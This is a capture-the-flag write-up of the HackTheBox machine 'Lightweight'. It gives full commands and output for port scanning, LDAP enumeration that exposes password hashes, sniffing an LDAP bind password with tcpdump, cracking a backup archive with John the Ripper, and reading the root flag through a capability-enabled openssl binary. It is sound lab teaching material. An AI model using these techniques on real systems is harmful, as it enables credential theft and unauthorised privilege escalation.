---
layout: post
title: Hackthebox Lightweight Writeup
categories: HackTheBox
---

<img src="/public/images/2019-05-17/lightweight_badge.png"><br>
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.
This is a write-up of machine "Lightweight" on that website.

## Solution
### 1. Initial Enumeration
Port Scanning:
{% highlight shell %}
root@kali:/usr/share/wordlists# nmap -sV -sC -p- 10.10.10.119
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-20 07:54 EET
Nmap scan report for 10.10.10.119
Host is up (0.036s latency).
Not shown: 65532 filtered ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA)
|   256 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA)
|_  256 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db (ED25519)
80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
|_http-title: Lightweight slider evaluation page - slendr
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
| ssl-cert: Subject: commonName=lightweight.htb
| Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain
| Not valid before: 2018-06-09T13:32:51
|_Not valid after:  2019-06-09T13:32:51
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 164.37 seconds
{% endhighlight %}

Since this box blocks huge traffic, we can not use gobuster here.<br>
Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u http://10.10.10.119 -x .php

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.119/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2019/05/17 18:26:20 Starting gobuster
=====================================================
/index.php (Status: 200)
2019/05/17 18:26:21 [!] Get http://10.10.10.119/15.php: dial tcp 10.10.10.119:80: connect: connection refused
2019/05/17 18:26:21 [!] Get http://10.10.10.119/icons: dial tcp 10.10.10.119:80: connect: connection refused
2019/05/17 18:26:21 [!] Get http://10.10.10.119/docs: dial tcp 10.10.10.119:80: connect: connection refused
2019/05/17 18:26:21 [!] Get http://10.10.10.119/18.php: dial tcp 10.10.10.119:80: connect: connection refused
2019/05/17 18:26:21 [!] Get http://10.10.10.119/features: dial tcp 10.10.10.119:80: connect: connection refused
/info.php (Status: 200)
2019/05/17 18:26:21 [!] Get http://10.10.10.119/tools: dial tcp 10.10.10.119:80: connect: connection refused
2019/05/17 18:26:21 [!] Get http://10.10.10.119/9.php: dial tcp 10.10.10.119:80: connect: connection refused
{% endhighlight %}

LDAP enumeration:
{% highlight shell %}
root@kali:/usr/share/wordlists# nmap -p 389 10.10.10.119 --script ldap-search --script-args 'ldap.qfiler=all'
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-20 08:03 EET
Nmap scan report for 10.10.10.119
Host is up (0.037s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-search: 
|   Context: dc=lightweight,dc=htb
|     dn: dc=lightweight,dc=htb
|         objectClass: top
|         objectClass: dcObject
|         objectClass: organization
|         o: lightweight htb
|         dc: lightweight
|     dn: cn=Manager,dc=lightweight,dc=htb
|         objectClass: organizationalRole
|         cn: Manager
|         description: Directory Manager
|     dn: ou=People,dc=lightweight,dc=htb
|         objectClass: organizationalUnit
|         ou: People
|     dn: ou=Group,dc=lightweight,dc=htb
|         objectClass: organizationalUnit
|         ou: Group
|     dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb
|         uid: ldapuser1
|         cn: ldapuser1
|         sn: ldapuser1
|         mail: ldapuser1@lightweight.htb
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: top
|         objectClass: shadowAccount
|         userPassword: {crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/
|         shadowLastChange: 17691
|         shadowMin: 0
|         shadowMax: 99999
|         shadowWarning: 7
|         loginShell: /bin/bash
|         uidNumber: 1000
|         gidNumber: 1000
|         homeDirectory: /home/ldapuser1
|     dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
|         uid: ldapuser2
|         cn: ldapuser2
|         sn: ldapuser2
|         mail: ldapuser2@lightweight.htb
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: top
|         objectClass: shadowAccount
|         userPassword: {crypt}$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1
|         shadowLastChange: 17691
|         shadowMin: 0
|         shadowMax: 99999
|         shadowWarning: 7
|         loginShell: /bin/bash
|         uidNumber: 1001
|         gidNumber: 1001
|         homeDirectory: /home/ldapuser2
|     dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: ldapuser1
|         userPassword: {crypt}x
|         gidNumber: 1000
|     dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: ldapuser2
|         userPassword: {crypt}x
|_        gidNumber: 1001

Nmap done: 1 IP address (1 host up) scanned in 0.74 seconds
{% endhighlight %}

### 2. Getting User

Since we can not use gobuster here, we have to enumerate the website manually.
![placeholder](https://inar1.github.io/public/images/2019-05-17/2019-05-17-19-39-18.png)

In this top page, we can find links to following pages.
1. /info.php
2. /status.php
3. /user.php

We can find interesting information on user.php
![placeholder](https://inar1.github.io/public/images/2019-05-17/2019-05-17-19-54-32.png)

According to this info, we can figure out we can login to this box with following credential.
{% highlight shell %}
10.10.14.4:10.10.14.4
{% endhighlight %}
{% highlight shell %}
root@kali:~# ssh 10.10.14.4@10.10.10.119
The authenticity of host '10.10.10.119 (10.10.10.119)' can't be established.
ECDSA key fingerprint is SHA256:FWyyew+o9WoPYkfIKGEbTMsexks1z8ZkSUs9O+2AMSU.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.119' (ECDSA) to the list of known hosts.
10.10.14.4@10.10.10.119's password:  # 10.10.14.4
[10.10.14.4@lightweight ~]$
{% endhighlight %}

After logged in, we can find an user "10.10.14.2".
{% highlight shell %}
[10.10.14.4@lightweight home]$ ls -la
total 0
drwxr-xr-x.  6 root       root        76 May 17 16:25 .
dr-xr-xr-x. 17 root       root       224 Jun 13  2018 ..
drwx------.  4 10.10.14.2 10.10.14.2  91 Nov 16 22:39 10.10.14.2
drwx------.  4 10.10.14.4 10.10.14.4  91 May 17 17:44 10.10.14.4
drwx------.  4 ldapuser1  ldapuser1  181 Jun 15  2018 ldapuser1
drwx------.  4 ldapuser2  ldapuser2  197 Jun 21  2018 ldapuser2
{% endhighlight %}

To get user.txt, we have to switch the user.<br>
In the home directory of "10.10.14.2", we can't find anything. So we have to switch to "ldapuser1" or "ldapuser2".

By using "getcap", we can find that we can sniff the network traffic.
{% highlight shell %}
[10.10.14.4@lightweight ~]$ getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/mtr = cap_net_raw+ep
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
{% endhighlight %}

Carry on network sniffing and when we access "/status.php" with web browser,<br>
we can find a credential of "ldapuser2".
{% highlight shell %}
[10.10.14.4@lightweight ~]$ tcpdump -i any -X port ldap
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes

~~~

18:23:46.631683 IP lightweight.htb.46158 > lightweight.htb.ldap: Flags [P.], seq 1:92, ack 1, win 683, options [nop,nop,TS val 7157713 ecr 7157713], length 91
	0x0000:  4500 008f 8af8 4000 4006 866f 0a0a 0a77  E.....@.@..o...w
	0x0010:  0a0a 0a77 b44e 0185 3d2b bd27 e3f3 b673  ...w.N..=+.'...s
	0x0020:  8018 02ab 2983 0000 0101 080a 006d 37d1  ....)........m7.
	0x0030:  006d 37d1 3059 0201 0160 5402 0103 042d  .m7.0Y...`T....-
	0x0040:  7569 643d 6c64 6170 7573 6572 322c 6f75  uid=ldapuser2,ou
	0x0050:  3d50 656f 706c 652c 6463 3d6c 6967 6874  =People,dc=light
	0x0060:  7765 6967 6874 2c64 633d 6874 6280 2038  weight,dc=htb..8
	0x0070:  6263 3832 3531 3333 3261 6265 3164 3766  bc8251332abe1d7f
	0x0080:  3130 3564 3365 3533 6164 3339 6163 3200  105d3e53ad39ac2.
	0x0090:  0000 0000 0000 0000 0000 0000 0000 00    ...............

~~~

^C
8 packets captured
22 packets received by filter
6 packets dropped by kernel
{% endhighlight %}
{% highlight shell %}
ldapuser2:8bc8251332abe1d7f105d3e53ad39ac2
{% endhighlight %}

We can switch the user with su command..<br>
User.txt is in the directory of /home/ldapuser2.
{% highlight shell %}
[10.10.14.4@lightweight ~]$ su ldapuser2
Password:  # 8bc8251332abe1d7f105d3e53ad39ac2
[ldapuser2@lightweight 10.10.14.4]$
{% endhighlight %}
{% highlight shell %}
[ldapuser2@lightweight ~]$ cat user.txt
8a866d3bb7e13a57aaeb110297f48026
[ldapuser2@lightweight ~]$ 
{% endhighlight %}

### 3. Getting Root

In the directory /home/ldapuser2, we can find some interesting files
{% highlight shell %}
[ldapuser2@lightweight ~]$ ls -l
total 1868
-rw-r--r--. 1 root      root         3411 Jun 14  2018 backup.7z
-rw-rw-r--. 1 ldapuser2 ldapuser2 1520530 Jun 13  2018 OpenLDAP-Admin-Guide.pdf
-rw-rw-r--. 1 ldapuser2 ldapuser2  379983 Jun 13  2018 OpenLdap.pdf
-rw-r--r--. 1 root      root           33 Jun 15  2018 user.txt
{% endhighlight %}

Try to transfer "backup.7z" to our machine. We can use base64 decoding.<br>
At first, convert it to base64 format.
{% highlight shell %}
[ldapuser2@lightweight ~]$ base64 -w0 backup.7z 
N3q8ryccAAQmbxM1EA0AAAAAAAAjAAAAAAA...

{% endhighlight %}

Then, copy&paste and decode on our host.
{% highlight shell %}
root@kali:~# echo -n N3q8ryccAAQmbxM1EA0AAAAAAAAjAAAAAA... | base64 -d > backup.7z

root@kali:~# ls -l | grep backup
-rw-r--r-- 1 root root 3411 May 17 21:32 backup.7z

root@kali:~# file backup.7z
backup.7z: 7-zip archive data, version 0.4
{% endhighlight %}

Since this backup file is password protected, we have to crack the password.
{% highlight shell %}
root@kali:~# 7z x backup.7z

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz (806EA),ASM,AES-NI)

Scanning the drive for archives:
1 file, 3411 bytes (4 KiB)

Extracting archive: backup.7z
--
Path = backup.7z
Type = 7z
Physical Size = 3411
Headers Size = 259
Method = LZMA2:12k 7zAES
Solid = +
Blocks = 1

    
Enter password (will not be echoed):
{% endhighlight %}

We can take dvantage of "7z2john.pl" installed on kali linux by default.
{% highlight shell %}
# install necessary module
root@kali:~# sudo apt-get install libcompress-raw-lzma-perl

# create hash for backup.7z
root@kali:/usr/share/john# ./7z2john.pl /root/backup.7z > /root/backup.7z.hash

# crack the hash with john the ripper
root@kali:~# john backup.7z.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip [SHA256 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 12 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
delete           (backup.7z)
1g 0:00:00:27 DONE (2019-05-17 21:52) 0.03595g/s 75.94p/s 75.94c/s 75.94C/s slimshady..morado
Use the "--show" option to display all of the cracked passwords reliably
Session completed
{% endhighlight %}

With this password "delete", we can extract the data from backup.z7.<br>
We can achieve some php files and we can find a credential in status.php.
{% highlight shell %}
root@kali:~# cat status.php 

~~~

<?php
$username = 'ldapuser1';
$password = 'f3ca9d298a553da117442deeb6fa932d';
$ldapconfig['host'] = 'lightweight.htb';
$ldapconfig['port'] = '389';
$ldapconfig['basedn'] = 'dc=lightweight,dc=htb';
//$ldapconfig['usersdn'] = 'cn=users';
$ds=ldap_connect($ldapconfig['host'], $ldapconfig['port']);
ldap_set_option($ds, LDAP_OPT_PROTOCOL_VERSION, 3);
ldap_set_option($ds, LDAP_OPT_REFERRALS, 0);
ldap_set_option($ds, LDAP_OPT_NETWORK_TIMEOUT, 10);
{% endhighlight %}
{% highlight shell %}
ldapuser1:f3ca9d298a553da117442deeb6fa932d
{% endhighlight %}

Switch to ldapuser1 with su command.
{% highlight shell %}
[10.10.14.4@lightweight ~]$ su ldapuser1
Password: 
[ldapuser1@lightweight 10.10.14.4]$
{% endhighlight %}

We have some executable in the home directory.
{% highlight shell %}
[ldapuser1@lightweight ~]$ ls -l
total 1484
-rw-rw-r--. 1 ldapuser1 ldapuser1   9714 Jun 15  2018 capture.pcap
-rw-rw-r--. 1 ldapuser1 ldapuser1    646 Jun 15  2018 ldapTLS.php
-rwxr-xr-x. 1 ldapuser1 ldapuser1 555296 Jun 13  2018 openssl
-rwxr-xr-x. 1 ldapuser1 ldapuser1 942304 Jun 13  2018 tcpdump
[ldapuser1@lightweight ~]$ 
{% endhighlight %}

The executables "openssl" has strong permission.
{% highlight shell %}
[ldapuser1@lightweight ~]$ getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/mtr = cap_net_raw+ep
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
/home/ldapuser1/tcpdump = cap_net_admin,cap_net_raw+ep
/home/ldapuser1/openssl =ep
{% endhighlight %}

By following command, we can achieve root.txt
{% highlight shell %}
[ldapuser1@lightweight ~]$ ./openssl base64 -in /root/root.txt | base64 -d
f1d4e309c5a6b3fffff74a8f4b2135fa
{% endhighlight %}
